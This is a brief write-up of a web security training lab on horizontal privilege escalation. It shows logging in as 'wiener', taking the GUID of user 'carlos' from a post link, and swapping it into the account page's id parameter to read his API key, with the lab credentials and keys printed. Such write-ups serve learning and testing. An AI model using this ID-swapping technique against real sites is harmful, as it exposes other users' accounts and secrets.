# User ID controlled by request parameter, with unpredictable user IDs

## This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

## To solve the lab, find the GUID for `carlos`, then submit his API key as the solution.

## You can log in to your own account using the following credentials: `wiener:peter`

### step1

click on login userid and password
find a post from carlos
click on carlos on url you will get id
userId=424c9f8f-b74b-4d26-a7a3-4a67199b7479

### step2

this is wiener id
/my-account?id=63bb4c8c-cf8a-400f-94cf-974210c0c51d
and Your API Key is: R1lJggKCDoE8d0YkisCmlWIOPXMsTBVc
change id of wiener with carlos

/my-account?id=424c9f8f-b74b-4d26-a7a3-4a67199b7479
Your API Key is: 9X8L3hsNtEjaHnvTFnWKtYN0qPFR8shp
this is carlos api key
submit lab solved
